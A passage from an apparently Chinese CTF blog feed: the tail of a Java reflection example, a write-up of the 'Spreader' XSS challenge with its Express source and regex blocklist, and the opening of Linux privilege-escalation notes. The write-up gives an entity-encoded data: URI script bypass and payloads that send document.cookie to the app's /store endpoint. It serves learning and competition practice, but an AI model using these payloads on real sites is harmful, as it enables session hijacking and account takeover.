class="line"></span><br><span class="line">          System.out.println(content.toString());</span><br><span class="line">          reader.close();</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">          System.err.println((<span class="string">&quot;Class not found: java.lang.Runtime&quot;</span>));</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">          System.err.println((<span class="string">&quot;Method not found: java.lang.Runtime()&quot;</span>));</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Q-A-反射"><a href="#Q-A-反射" class="headerlink" title="*Q&amp;A 反射"></a>*Q&amp;A 反射</h3><h4 id="1-为什么必须使用try-catch"><a href="#1-为什么必须使用try-catch" class="headerlink" title="1. 为什么必须使用try-catch?"></a>1. 为什么必须使用try-catch?</h4><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>泛型<ol><li><a href="https://www.nenggz.com/md/java/basic/java-basic-x-generic.html">详细</a></li></ol></li><li>反射<ol><li><a href="https://www.nenggz.com/md/java/basic/java-basic-x-reflection.html">详细解释</a></li><li><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xnD0DuADtBrxBqooGkWDOiyexAIIQdx">挺细的一篇博客</a></li><li>javasec</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spreader_强网拟态24</title>
      <link href="/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"/>
      <url>/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-ALMOST-DONE"><a href="#分析与尝试-ALMOST-DONE" class="headerlink" title="分析与尝试(ALMOST DONE)"></a>分析与尝试(ALMOST DONE)</h2><ol><li><p>代码分析</p><ol><li>考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS</li><li>看一下代码，将用户存在users列表里，密码明文存储</li><li>访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容</li><li>访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和admin的文章</li><li>任何人都可以获取&#x2F;store的内容，存的是req.body</li><li>显然要读&#x2F;flag内容</li></ol></li><li><p>不是哥们，如果我先做过这题网鼎直接秒了啊，真实艹了，现在轮到我秒你了，还是假装一下</p></li><li><p>目标，通过admin读到flag，然后写在post里或者&#x2F;store回来？也可以是直接带外如果开网的话，通过&#x2F;report_admin让admin来看</p><ol><li><em><strong>attacks(可以的，没有问题)</strong></em>: 普通用户写内容，&#x2F;report_previleged读让&#x2F;report_admin触发admin访问&#x2F;flag读取内容后访问&#x2F;store写入，然后使用本地用户登录并访问&#x2F;store即可</li><li>现在的问题在于<strong>绕过</strong>：检测大小写与全局，特殊函数<code>eval(</code>需要左括号才会被过滤，允许使用href和src但是不能加上恶意东西<ol><li>想到base64编码但是被过滤了，php伪协议+其他编码？source被过滤了</li><li>刚好<code>window[&#39;eval&#39;](atob(data))</code>可以行得通，可打，怎么调用到js –&gt; <em><strong>还是看题解了，不要浪费太多实践</strong></em></li></ol></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缺点：需要herf点击，这里行不通</span></span><br><span class="line"><span class="comment">// 返回javascript:后面就是可读内容</span></span><br><span class="line"><span class="comment">// javascript:在herf里才可以，img行不通</span></span><br><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;<span class="variable language_">window</span>[<span class="string">&#x27;eval&#x27;</span>](<span class="title function_">atob</span>(data)) <span class="comment">// 在data中输入base64编码的值</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="bypass-and-payload"><a href="#bypass-and-payload" class="headerlink" title="***bypass and payload"></a>***bypass and payload</h2><ol><li><p>bypass: 这里使用了<em><strong>html自动闭合</strong></em>的特性调用js，使用<em><strong>实体编码</strong></em>来绕过关键词</p><ol><li>这里如果使用python发包的话，可以抓包看看是x-www-urlencoded或者是application&#x2F;json</li></ol> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc 成功调用alert() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span>&lt;/script</span><br></pre></td></tr></table></figure></li><li><p>paylaod</p><ol><li><p>打cookie写法，标签未闭合绕过</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取previlegedcookie</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script</span><br><span class="line"><span class="comment">// 2. 不出网，上传后/report_privileged写入&#x27;/store&#x27;带出cookie</span></span><br><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/store&#x27;</span>,&#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,<span class="attr">body</span>:<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&#125;);&lt;/script</span><br><span class="line"><span class="comment">// 3. 登录previleged，同理上传后/report_privileged</span></span><br><span class="line"><span class="comment">// 4. 获取cookie访问/flag</span></span><br></pre></td></tr></table></figure></li><li><p>写入载体法略，总之js写一下在键值中再写一次就好</p></li></ol></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; triggerXSS &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Store</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAuthenticated</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROLES</span> = &#123;</span><br><span class="line">        <span class="attr">PLAIN</span>: <span class="string">&quot;plain&quot;</span>,</span><br><span class="line">        <span class="attr">PRIVILEGED</span>: <span class="string">&quot;privileged&quot;</span>,</span><br><span class="line">        <span class="attr">ADMIN</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;register.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password, role &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userExists = users.<span class="title function_">some</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Username already exists!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;login.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">        <span class="keyword">const</span> user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">        <span class="keyword">if</span> (user) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentUser = req.<span class="property">session</span>.<span class="property">user</span>;</span><br><span class="line">        <span class="keyword">let</span> filteredPosts = [];</span><br><span class="line">        <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class="attr">posts</span>: filteredPosts, <span class="attr">user</span>: currentUser &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> scriptTagRegex = <span class="regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(scriptTagRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> eventHandlerRegex = <span class="regexp">/on\w+\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(eventHandlerRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> javascriptURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*javascript:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(javascriptURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dataURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*data:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dataURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cssExpressionRegex = <span class="regexp">/style\s*=\s*([&quot;&#x27;]).*?expression\([^&gt;]*?\).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(cssExpressionRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousTagsRegex = <span class="regexp">/&lt;\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousTagsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousAttributesRegex = <span class="regexp">/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousAttributesRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousProtocolsRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousProtocolsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousFunctionsRegex = <span class="regexp">/\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousFunctionsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        posts.<span class="title function_">push</span>(&#123; <span class="attr">content</span>: content, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">role</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_admin&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;admin&quot;</span>,<span class="title class_">AdminPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_privileged&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;privileged&quot;</span>,<span class="title class_">PrivilegedPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(store);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>) &#123;</span><br><span class="line">            store.<span class="title function_">push</span>(req.<span class="property">body</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Data stored successfully&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No data received&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class="line">                        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">`Your Flag Here: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2024/11/04/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/11/04/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="*Ref"></a>*Ref</h2><ol><li>特权教程<ol><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">多种提权姿势都有讲到</a></li><li><a href="https://blog.csdn.net/st3pby/article/details/127718846">很好的文章！数据库等提权</a></li></ol></li><li>linux命令手册<ol><li><a href="https://linux.die.net/">官方</a></li><li><a href="https://www.linuxcool.com/">民间教程</a></li></ol></li><li>T00ls<ol><li><strong>终极大杀器</strong><a href="https://gtfobins.github.io/">GTFOBins</a><ol><li>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制<ol><li>该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利</li></ol></li><li><strong>only 参照表:</strong> 需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限。</li></ol></li></ol></li></ol><h2 id="Linux权限基本概念"><a href="#Linux权限基本概念" class="headerlink" title="Linux权限基本概念"></a>Linux权限基本概念</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ol><li>Linux 是一个多用户操作系统，每个用户都有自己的用户名和密码，并且可以属于一个或多个用户组</li><li><em><strong>进程权限:</strong></em> 每个进程都会以某个特定的用户身份运行，该进程的权限受该用户权限的限制</li><li><em><strong>文件权限:</strong></em> 在 Linux 中，文件和目录都有所有权和权限设置。这些权限决定了哪些用户可以读取、写入或执行文件。当一个进程试图访问文件时，它只能根据其运行的用户身份所具有的权限来进行操作</li></ol><h3 id="进程权限继承"><a href="#进程权限继承" class="headerlink" title="进程权限继承"></a>进程权限继承</h3><ol><li>linux中子进程从父进程那里继承一定的权限和属性</li><li>用户和组 ID 继承 –&gt; 对文件读写权限的继承<ol><li>Real User ID, RUID：表示启动进程的实际用户</li><li>Effective User ID, EUID：用于确定进程的权限。</li><li>Saved Set User ID, SUID：用于在切换用户 ID 时存储原来的 